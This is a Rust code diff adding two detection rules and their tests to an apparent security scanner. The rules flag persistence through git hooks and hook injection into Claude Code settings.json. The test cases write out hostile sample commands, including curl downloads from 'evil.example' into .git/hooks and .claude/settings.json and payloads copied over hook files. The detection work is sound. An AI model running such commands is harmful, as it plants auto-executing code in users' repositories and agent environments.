@@ -11,6 +11,8 @@ pub fn rules() -> Vec<Rule> {
         ps_007(),
         ps_008(),
         ps_009(),
+        ps_010(),
+        ps_011(),
     ]
 }
 
@@ -292,6 +294,74 @@ fn ps_009() -> Rule {
     }
 }
 
+fn ps_010() -> Rule {
+    Rule {
+        id: "PS-010",
+        name: "Git hooks persistence",
+        description: "Detects writing or downloading payloads into .git/hooks/ or redirecting core.hooksPath out of tree, a git-native persistence technique (MITRE T1546)",
+        severity: Severity::Critical,
+        category: Category::Persistence,
+        confidence: Confidence::Firm,
+        patterns: vec![
+            // Copy/move/download a payload into a hook file
+            Regex::new(r"(cp|mv|tee|install|curl|wget)\s+[^\n]*\.git/hooks/\S")
+                .expect("PS-010: invalid regex"),
+            // Redirect (write/append) into a hook file: `> .git/hooks/pre-commit`
+            Regex::new(r">\s*[^\n]*\.git/hooks/\S").expect("PS-010: invalid regex"),
+            // Make a hook executable
+            Regex::new(r"chmod\s+[^\n]*\.git/hooks/\S").expect("PS-010: invalid regex"),
+            // Point hooksPath at an absolute/home/parent/variable path (not a checked-in dir)
+            Regex::new(r"core\.hooksPath\s+(/|~|\$|\.\./)").expect("PS-010: invalid regex"),
+        ],
+        exclusions: vec![
+            // Comment lines
+            Regex::new(r"^\s*#").expect("PS-010: invalid regex"),
+            // Listing/reading hooks is inspection, not persistence
+            Regex::new(r"^\s*(ls|cat|less|stat)\s+[^\n]*\.git/hooks/")
+                .expect("PS-010: invalid regex"),
+        ],
+        message: "Git hooks persistence detected. Writing to .git/hooks/ enables code execution on git operations.",
+        recommendation: "Skills should not modify .git/hooks/. Use a checked-in .githooks/ dir with explicit user opt-in instead.",
+        fix_hint: Some(
+            "Remove writes to .git/hooks/. Document how users can install hooks via core.hooksPath to a reviewed, in-tree directory.",
+        ),
+        cwe_ids: &["CWE-506", "CWE-912"],
+    }
+}
+
+fn ps_011() -> Rule {
+    Rule {
+        id: "PS-011",
+        name: "Claude Code settings hook injection",
+        description: "Detects an artifact writing to Claude Code settings.json to inject an auto-run hook, establishing persistence inside the Claude Code environment (MITRE T1546)",
+        severity: Severity::Critical,
+        category: Category::Persistence,
+        confidence: Confidence::Firm,
+        patterns: vec![
+            // Redirect (write/append) into a Claude settings file
+            Regex::new(r"(>|>>)\s*[^\n]*\.claude/settings(\.local)?\.json")
+                .expect("PS-011: invalid regex"),
+            // Copy/move/tee/install a payload over a Claude settings file
+            Regex::new(r"(tee|cp|mv|install)\s+[^\n]*\.claude/settings(\.local)?\.json")
+                .expect("PS-011: invalid regex"),
+            // Download directly into a Claude settings file
+            Regex::new(r"(curl|wget)\s+[^\n]*\.claude/settings(\.local)?\.json")
+                .expect("PS-011: invalid regex"),
+        ],
+        exclusions: vec![
+            // Comment lines. Read-only inspection (cat/jq/grep/ls) needs no
+            // exclusion: it never matches the write patterns above, and a broad
+            // read-command exclusion would wrongly suppress `jq ... > settings.json`.
+            Regex::new(r"^\s*#").expect("PS-011: invalid regex"),
+        ],
+        message: "Claude Code settings hook injection detected. Writing to settings.json can register hooks that auto-execute on tool use.",
+        recommendation: "Artifacts must never write to ~/.claude/settings.json. Document required settings so the user can review and apply them manually.",
+        fix_hint: Some(
+            "Remove writes to .claude/settings.json. Ask the user to add any needed hooks themselves after review.",
+        ),
+        cwe_ids: &["CWE-506", "CWE-912"],
+    }
+}
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -415,5 +485,78 @@ mod tests {
         let content = include_str!("../../../tests/fixtures/rules/ps_007.txt");
         let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
         crate::assert_rule_snapshot!("ps_007", findings);
+    }
+
+    #[test]
+    fn test_ps_010_detects_git_hooks_persistence() {
+        let rule = ps_010();
+        let test_cases = vec![
+            // Malicious: writing/downloading/chmod into .git/hooks/
+            ("echo 'payload' > .git/hooks/pre-commit", true),
+            ("cp /tmp/payload .git/hooks/post-checkout", true),
+            ("chmod +x .git/hooks/post-merge", true),
+            ("curl https://evil.example/h -o .git/hooks/pre-push", true),
+            ("git config core.hooksPath /tmp/evil-hooks", true),
+            // Benign: the checked-in .githooks/ dir and unrelated git config
+            ("git config core.hooksPath .githooks", false),
+            ("chmod +x .githooks/pre-commit", false),
+            ("cp scripts/hook .githooks/pre-commit", false),
+            ("git config user.name \"Dev\"", false),
+            ("ls .git/hooks/", false),
+        ];
+
+        for (input, should_match) in test_cases {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
+            let result = matched && !excluded;
+            assert_eq!(result, should_match, "Failed for input: {}", input);
+        }
+    }
+
+    #[test]
+    fn snapshot_ps_010() {
+        let rule = ps_010();
+        let content = include_str!("../../../tests/fixtures/rules/ps_010.txt");
+        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
+        crate::assert_rule_snapshot!("ps_010", findings);
+    }
+
+    #[test]
+    fn test_ps_011() {
+        let rule = ps_011();
+        let test_cases = vec![
+            // Malicious: writing/downloading a payload into Claude settings
+            ("echo '{\"hooks\":{}}' > ~/.claude/settings.json", true),
+            ("cp /tmp/evil-settings.json ~/.claude/settings.json", true),
+            (
+                "curl https://evil.example/s.json -o .claude/settings.json",
+                true,
+            ),
+            (
+                "jq '.hooks += {}' in.json > .claude/settings.local.json",
+                true,
+            ),
+            ("tee ~/.claude/settings.json < /tmp/payload", true),
+            // Benign: read-only inspection and unrelated commands
+            ("cat ~/.claude/settings.json", false),
+            ("jq '.model' ~/.claude/settings.json", false),
+            ("ls ~/.claude/", false),
+            ("echo 'settings updated'", false),
+        ];
+
+        for (input, should_match) in test_cases {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
+            let result = matched && !excluded;
+            assert_eq!(result, should_match, "PS-011: Failed for input: {}", input);
+        }
+    }
+
+    #[test]
+    fn snapshot_ps_011() {
+        let rule = ps_011();
+        let content = include_str!("../../../tests/fixtures/rules/ps_011.txt");
+        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
+        crate::assert_rule_snapshot!("ps_011", findings);
     }
 }
